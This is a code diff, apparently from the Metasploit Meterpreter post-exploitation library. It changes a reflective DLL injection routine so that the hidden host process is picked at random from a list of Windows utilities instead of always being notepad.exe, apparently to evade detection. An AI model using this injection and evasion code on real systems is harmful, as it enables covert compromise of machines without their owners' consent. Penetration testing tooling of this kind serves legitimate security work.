@@ -53,20 +53,22 @@ module Process
   end
 
   #
-  # Injects a reflective DLL in to a process, and executes it.
+  # Injects a reflective DLL into a process, and executes it.
   #
   # @param rdll_path [String] The path to the DLL to inject
   # @param param     [String, Integer, nil] The parameter to pass to the DLL's entry point. If this value is a String
   #   then it will first be written into the process memory and then passed by reference. If the value is an Integer,
   #   then the value will be passed as is. If the value is nil, it'll be passed as a NULL pointer.
-  # @param pid       [Integer] The process ID to inject to, if unspecified, a new instance of notepad.exe will be
-  #   launched to host the injected DLL.
+  # @param pid       [Integer] The process ID to inject to, if unspecified, a new instance of a random EXE from the
+  #   process_list array will be launched to host the injected DLL.
   def execute_dll(rdll_path, param=nil, pid=nil)
+    process_list = ['sigverif', 'netsh', 'nslookup', 'winver', 'nbtstat -r 200', 'dxpserver', 'sndvol', 'netstat 200']
     if pid.nil?
-      print_status('Launching notepad to host the DLL...')
-      notepad_process = client.sys.process.execute('notepad.exe', nil, { 'Hidden' => true })
+      process_cmd = process_list.sample
+      print_status("Launching #{process_cmd} to host the DLL...")
+      host_process = client.sys.process.execute(process_cmd, nil, { 'Hidden' => true })
       begin
-        process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+        process = client.sys.process.open(host_process.pid, PROCESS_ALL_ACCESS)
         print_good("Process #{process.pid} launched.")
       rescue Rex::Post::Meterpreter::RequestError
         # Reader Sandbox won't allow to create a new process:
@@ -77,7 +79,6 @@ module Process
     else
       process = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
     end
-
     print_status("Reflectively injecting the DLL into #{process.pid}...")
     exploit_mem, offset = inject_dll_into_process(process, ::File.expand_path(rdll_path))
 
